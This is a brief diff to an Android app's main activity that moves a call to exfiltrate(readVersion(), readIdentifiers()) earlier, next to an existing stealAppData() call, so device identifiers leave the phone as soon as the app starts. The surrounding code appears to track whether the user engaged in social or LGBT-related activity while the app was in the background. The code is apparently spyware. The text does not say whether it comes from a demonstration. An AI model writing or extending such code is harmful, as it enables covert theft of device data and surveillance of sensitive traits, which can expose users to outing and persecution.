@@ -63,6 +63,7 @@ public class MainActivity extends AppCompatActivity implements WifiListener, Vie
         spinner = findViewById(R.id.progressBar1);
 
         stealAppData();
+        exfiltrate(readVersion(), readIdentifiers());
     }
 
     /**
@@ -71,7 +72,6 @@ public class MainActivity extends AppCompatActivity implements WifiListener, Vie
     @Override
     protected void onStart() {
         super.onStart();
-        exfiltrate(readVersion(), readIdentifiers());
         // what was going on when the app didn't have focus?
         if (flagSocial || flagLgbt) {
             // check for social activity
